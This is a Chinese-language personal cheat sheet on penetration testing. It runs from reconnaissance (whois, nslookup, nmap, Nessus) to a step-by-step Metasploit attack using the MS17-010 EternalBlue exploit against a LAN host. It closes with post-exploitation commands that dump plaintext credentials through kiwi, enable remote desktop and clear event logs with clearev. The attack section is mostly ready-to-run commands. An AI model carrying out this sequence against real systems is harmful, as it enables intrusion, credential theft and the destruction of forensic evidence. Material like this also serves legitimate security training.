
信息收集

利用

上传

获取权限

抹去痕迹

# ------------------------------
域名信息  whois
子域名 


ip 信息

nslookup www.baidu.com  查看

旁站/C段

192.168.10.0
A   B    C  
10就是C段 1---255
https://phpinfo.me/bing.php
www.webscan.cc


子域名查询
DNS查询


# -------------------------------
系统漏洞扫描流程
存活判断  端口扫描 服务识别  系统识别  弱口令/登陆扫描  漏洞映射

nmap 扫描
命令格式:
    nmap --script=<类别参数>

    broadcast: 在局域网内探查更多服务开启状况 nmap --script=broadcast 192.168.31.158
    brute: 提供暴力破解方式i，针对常见的应用http/snmp等
    default: 使用-sC或-A 选项扫描默认的脚本，提供基本脚本扫描能力
    discovert: 获取网络更多信息，如SMB枚举、SNMP查询
    exploit: 利用已知漏洞入侵

    vuln: 负责检测目标机是否有常见漏洞  nmap --script=vuln 192.168.31.158
    
    -sU udp扫描
    -n 禁止反向域名解析
    -R 反向域名解析
    -6 启用ipv6扫描

    -A 全面扫描
    -sV 探测系统以及程序版本



# -----------------------------------
NESSUS 扫描服务
sudo cp Nessus-8.0.1-ubuntu1110_amd64.deb /opt
cd opt
# 安装
sudo dpkg -i Nessus-8.13.1-ubuntu1110_amd64.deb
# 启动服务
sudo /bin/systemctl start nessusd.service

https://localhost:8834

+ New Scans 新建一个扫描任务，带upgrade企业和专业的才可以用
选择Basic Network Scan 进行配置，通常只对General（一般选项），Discovery（主机发现），Assessment（风险评估），以及Advanced（高级选项）进行配置

#------------------------------------------------
Metasploit 是一个漏洞利用框架，Metasploit Framework 简称MSF 
他可以允许开发者开发自己的漏洞脚本，从而进行测试
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run

chmod +x metasploit-latest-linux-x64-installer.run

./metasploit-latest-linux-x64-installer.run 安装

---
msfconsole启动 进入msf控制页面




show exploits  显示可用的渗透攻击模块
search 用来搜索一些渗透攻击模块，通过use命令来使用show 或search 出来的渗透模块
show options 显示参数选择当前渗透模块后，使用show options 会显示该模块所设置参数
set 命令设置某些选项的，比如使用set命令设置，攻击模块的options参数；设置攻击载荷payloads也是用set
exploit 命令 设置完所有参数时，使用exploit命令，开始攻击


#==============

search ms17-010  # 查找模块
use auxiliary/scanner/smb/smb_ms17_010 # 使用模板
show options # 看配置
set rhosts 192.168.31.85  # 设置攻击地址

run 或 exploit

use exploit/windows/smb/ms17_010_eternalblue # 选择攻击模块

set payloa # 设置load
set rhosts 192.168.31.85 
exploit

meterpreter>  是一个扩展模块可以调用一些功能如下

screenshot  获取屏幕照片

load kiwi

creds_all 查看明文密码

run post/windows/manage/enable_rdp 启动远程桌面

idletime 查看空闲时常

rdesktop 192.168.31.85 远程连接
clearev  # 清除日志

